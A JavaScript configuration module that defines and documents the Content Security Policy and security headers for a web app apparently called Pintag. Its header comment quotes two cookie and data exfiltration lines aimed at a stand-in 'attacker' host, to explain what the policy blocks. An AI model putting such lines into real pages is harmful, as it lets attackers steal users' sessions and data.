// ============================================================================
// scripts/csp-policy.mjs — THE single source of truth for Pintag's Content
// Security Policy, and the tool that stamps it into every deployed page.
// ============================================================================
//
//   node scripts/apply-csp.mjs          # stamp / refresh the policy (idempotent)
//   node --test csp.test.js             # assert every deployed page carries it
//
// WHY A META TAG AND NOT A HEADER
// -------------------------------
// pintag.io is served by GitHub Pages, which cannot set response headers at
// all. The only delivery mechanism the repository itself controls is
// <meta http-equiv="Content-Security-Policy"> in each page's <head>. That is a
// real, fully-enforced CSP for every directive except the few that are
// header-only (frame-ancestors, report-to). Those are set instead by the
// Cloudflare Worker for the four routes it fronts, and by a Cloudflare
// Transform Rule for everything else — see docs/CSP.md.
//
// WHY 'unsafe-inline' IS STILL IN script-src
// ------------------------------------------
// This is the honest limitation and it should not be glossed over. Pintag
// generates inline event handlers at runtime with interpolated data, e.g.
//
//   onclick="ptContactClick({listingId:'<uuid>', ...})"
//
// Those attributes are inline script. A nonce cannot cover them (nonces apply
// to <script> elements, not attributes) and a hash cannot either, because the
// handler text differs per listing and is built at render time. Removing
// 'unsafe-inline' therefore requires migrating every generated handler to
// addEventListener delegation across listing.html, admin.html, listings.html,
// dashboard.html and intelligence.js — a large behavioural refactor, which is
// deliberately NOT bundled into a security pass. It is tracked in docs/CSP.md
// as the prerequisite for a strict policy.
//
// So: this CSP does NOT stop injected script from RUNNING. What it does stop is
// everything that makes injected script profitable:
//
//   * connect-src  — pinned to the two known Supabase project hosts, so
//                    fetch('https://attacker/'+document.cookie) is refused.
//                    This is the directive that would have blunted F-01/F-02.
//   * img-src      — pinned, closing the `new Image().src = 'https://attacker/?'+data`
//                    exfiltration channel that survives a strict connect-src.
//   * script-src   — host allowlist, so an injection cannot pull in a payload
//                    from an attacker's CDN.
//   * base-uri / form-action / object-src — close <base> hijacking, form-based
//                    exfiltration, and plugin content.
//
// Exact hosts, never wildcards, for the Supabase origins specifically: a
// `https://*.supabase.co` wildcard would let an attacker exfiltrate to a
// Supabase project THEY created, which anyone can do for free in a minute.
// Both the production and the pintag-dev project are listed because the same
// page HTML is deployed to both sites (config.js differs, the markup does not).

export const SUPABASE_PROD = 'https://eoladhcljbpbhnrmmpev.supabase.co';
export const SUPABASE_DEV  = 'https://ebtgoqrywdywuqrvudcp.supabase.co';

// Directive order is fixed so the emitted string is byte-stable and a drifted
// page is trivially diffable.
export const CSP_DIRECTIVES = [
  // Nothing loads from anywhere unless a directive below says so.
  ["default-src", ["'self'"]],

  // Cannot be re-pointed by an injected <base href>.
  ["base-uri", ["'self'"]],

  // No <object>/<embed>/<applet>. Pintag has none.
  ["object-src", ["'none'"]],

  // No form may post anywhere but back to the site. Pintag has no <form action>
  // at all today, so this costs nothing and removes a classic exfil channel.
  ["form-action", ["'self'"]],

  // supabase-js (admin pages) and Leaflet (listings map) are the only external
  // scripts. 'unsafe-inline' — see the header comment; it is the known gap.
  ["script-src", ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net", "https://unpkg.com"]],

  // Google Fonts stylesheet + Leaflet stylesheet. 'unsafe-inline' is required
  // by the many generated style="…" attributes; unlike scripts, inline STYLE is
  // not a meaningful code-execution vector here.
  ["style-src", ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com", "https://unpkg.com"]],

  ["font-src", ["'self'", "data:", "https://fonts.gstatic.com"]],

  // Listing photos (Supabase Storage, or img.pintag.io once the CDN flag is on),
  // OG preview assets on the Pages origin, Leaflet's own marker sprites, and
  // OpenStreetMap tiles. data:/blob: are needed by the client-side watermarker
  // (canvas.toDataURL) and by upload previews.
  ["img-src", [
    "'self'", "data:", "blob:",
    SUPABASE_PROD, SUPABASE_DEV,
    "https://img.pintag.io",
    "https://pintag-cyrora.github.io",
    "https://unpkg.com",
    "https://*.tile.openstreetmap.org",
    // index.html's two hero background-image: url("…") declarations. Found by
    // the browser test, not by reading the source — a `url("https://…` in a
    // <style> block is easy to miss when grepping for src=/href=, which is
    // precisely why the CSP is verified in a real browser before it ships.
    // Safe to allow: an attacker cannot read what a victim's browser sends to
    // a host they do not control, so this is not an exfiltration channel.
    "https://images.unsplash.com",
  ]],

  // The ONLY place the browser may send data. Exact project hosts, no wildcard.
  // wss: covers Supabase Realtime if it is ever switched on.
  ["connect-src", [
    "'self'",
    SUPABASE_PROD, SUPABASE_DEV,
    SUPABASE_PROD.replace('https://', 'wss://'),
    SUPABASE_DEV.replace('https://', 'wss://'),
  ]],

  // Google Maps location embed (listing page) and YouTube property video embeds.
  ["frame-src", [
    "https://maps.google.com", "https://www.google.com",
    "https://www.youtube.com", "https://www.youtube-nocookie.com",
  ]],

  ["media-src", ["'self'", "blob:", SUPABASE_PROD, SUPABASE_DEV]],
  ["worker-src", ["'self'", "blob:"]],
  ["manifest-src", ["'self'"]],

  // Any stray http:// subresource is fetched over https instead of being
  // silently blocked as mixed content.
  ["upgrade-insecure-requests", []],
];

export function buildCsp() {
  return CSP_DIRECTIVES
    .map(([name, values]) => (values.length ? `${name} ${values.join(' ')}` : name))
    .join('; ');
}

// frame-ancestors and report-to are IGNORED inside a meta tag (the browser logs
// a console warning and drops them), so they are deliberately excluded from the
// meta policy and delivered as a real header instead. Keeping them out of the
// meta also keeps the console clean, which matters because the CSP test asserts
// there are zero CSP console messages.
export const HEADER_ONLY_CSP = "frame-ancestors 'none'";

// Supporting headers that have no meta equivalent at all. Delivered by the
// Cloudflare Worker on the routes it fronts, and by a Transform Rule elsewhere.
export const SECURITY_HEADERS = {
  'Content-Security-Policy': `${buildCsp()}; ${HEADER_ONLY_CSP}`,
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
  'X-Content-Type-Options': 'nosniff',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  // Pintag asks for none of these. Denying them means an injected script cannot
  // silently reach for the camera, microphone or precise location either.
  'Permissions-Policy': 'accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()',
  // Legacy equivalent of frame-ancestors, for browsers that predate CSP2.
  'X-Frame-Options': 'DENY',
};

// The pages actually published to pintag.io. deploy-prod.yml prunes the legacy
// agent portal and marketing-os from the artifact, so those are excluded here
// too — stamping a policy onto a page that is never served would be misleading.
export const PRUNED_FROM_PRODUCTION = [
  'agent-login.html', 'dashboard.html', 'edit-listing.html',
  'add-property.html', 'marketing-os.html',
];

export const CSP_MARKER = 'Pintag Content Security Policy';
